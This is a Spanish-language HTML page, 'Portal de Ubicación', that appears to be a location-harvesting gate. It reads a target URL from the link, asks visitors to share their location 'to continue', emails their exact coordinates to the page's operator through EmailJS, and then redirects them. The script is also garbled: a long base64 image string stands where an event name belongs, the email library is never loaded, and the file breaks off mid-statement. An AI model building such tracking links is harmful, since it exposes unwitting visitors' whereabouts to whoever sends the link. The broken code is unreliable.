<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Ubicación</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }
        
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 10px;
            font-size: 28px;
        }
        
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .location-info {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            display: none;
        }
        
        .location-item {
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
        }
        
        .location-label {
            font-weight: bold;
            color: #333;
        }
        
        .location-value {
            color: #666;
            max-width: 60%;
            text-align: right;
            word-break: break-all;
        }
        
        .btn {
            background-color: #4a90e2;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            transition: background-color 0.3s;
            margin-bottom: 10px;
        }
        
        .btn:hover {
            background-color: #3a80d2;
        }
        
        .btn:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .map-container {
            height: 200px;
            width: 100%;
            margin-top: 15px;
            border-radius: 8px;
            overflow: hidden;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Portal de Ubicación</h1>
        <p class="subtitle">Por favor, permita el acceso a su ubicación para continuar</p>
        
        <button id="getLocationBtn" class="btn">Obtener mi ubicación</button>
        
        <div class="location-info" id="locationInfo">
            <div class="location-item">
                <span class="location-label">Latitud:</span>
                <span class="location-value" id="latitude">-</span>
            </div>
            <div class="location-item">
                <span class="location-label">Longitud:</span>
                <span class="location-value" id="longitude">-</span>
            </div>
            <div class="location-item">
                <span class="location-label">Precisión:</span>
                <span class="location-value" id="accuracy">-</span>
            </div>
            <div class="location-item">
                <span class="location-label">Timestamp:</span>
                <span class="location-value" id="timestamp">-</span>
            </div>
            
            <div class="map-container" id="mapContainer">
                <iframe id="mapFrame" width="100%" height="100%" frameborder="0" style="border:0"></iframe>
            </div>
            
            <button id="submitBtn" class="btn">Enviar y continuar</button>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Procesando su información...</p>
        </div>
        
        <div class="message" id="message"></div>
    </div>

    <script>
        document.addEventListener('data:image/jpeg;base64,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', function() {
            // Obtener el parámetro URL de la cadena de consulta
            const urlParams = new URLSearchParams(window.location.search);
            const targetUrl = urlParams.get('url');
            
            // Si no hay URL, mostrar un mensaje de error
            if (!targetUrl) {
                showMessage('No se ha especificado una URL de destino.', 'error');
                document.getElementById('getLocationBtn').disabled = true;
                return;
            }
            
            let locationData = null;
            
            // Manejar el clic en el botón de obtener ubicación
            document.getElementById('getLocationBtn').addEventListener('click', function() {
                if (navigator.geolocation) {
                    document.getElementById('loading').style.display = 'block';
                    document.getElementById('getLocationBtn').disabled = true;
                    
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            // Éxito al obtener la ubicación
                            locationData = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date(position.timestamp).toLocaleString(),
                                targetUrl: targetUrl
                            };
                            
                            // Mostrar la información de ubicación
                            document.getElementById('latitude').textContent = locationData.latitude;
                            document.getElementById('longitude').textContent = locationData.longitude;
                            document.getElementById('accuracy').textContent = locationData.accuracy + ' metros';
                            document.getElementById('timestamp').textContent = locationData.timestamp;
                            
                            // Mostrar mapa
                            const mapFrame = document.getElementById('mapFrame');
                            mapFrame.src = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}&z=15&output=embed`;
                            document.getElementById('mapContainer').style.display = 'block';
                            
                            // Mostrar sección de información y ocultar carga
                            document.getElementById('locationInfo').style.display = 'block';
                            document.getElementById('loading').style.display = 'none';
                        },
                        function(error) {
                            // Error al obtener la ubicación
                            let errorMessage = '';
                            switch(error.code) {
                                case error.PERMISSION_DENIED:
                                    errorMessage = "El usuario denegó el permiso de geolocalización.";
                                    break;
                                case error.POSITION_UNAVAILABLE:
                                    errorMessage = "La información de ubicación no está disponible.";
                                    break;
                                case error.TIMEOUT:
                                    errorMessage = "La solicitud para obtener la ubicación ha caducado.";
                                    break;
                                case error.UNKNOWN_ERROR:
                                    errorMessage = "Ha ocurrido un error desconocido.";
                                    break;
                            }
                            
                            showMessage(errorMessage, 'error');
                            document.getElementById('loading').style.display = 'none';
                            document.getElementById('getLocationBtn').disabled = false;
                        }
                    );
                } else {
                    showMessage("La geolocalización no es compatible con este navegador.", 'error');
                }
            });
            
            // Manejar el envío de la ubicación
            document.getElementById('submitBtn').addEventListener('click', function() {
                if (!locationData) {
                    showMessage('No se ha obtenido la ubicación. Inténtelo de nuevo.', 'error');
                    return;
                }
                
                // Mostrar indicador de carga
                document.getElementById('loading').style.display = 'block';
                document.getElementById('submitBtn').disabled = true;
                
                // Enviar datos a EmailJS
                emailjs.send("service_id", "template_id", locationData)
                    .then(function(response) {
                        console.log("SUCCESS", response);
                        showMessage('Información enviada correctamente. Será redirigido en unos momentos...', 'success');
                        
                        // Redirigir al usuario después de un breve retraso
                        setTimeout(function() {
                            window.location.href = targetUrl;
                        }, 3000);
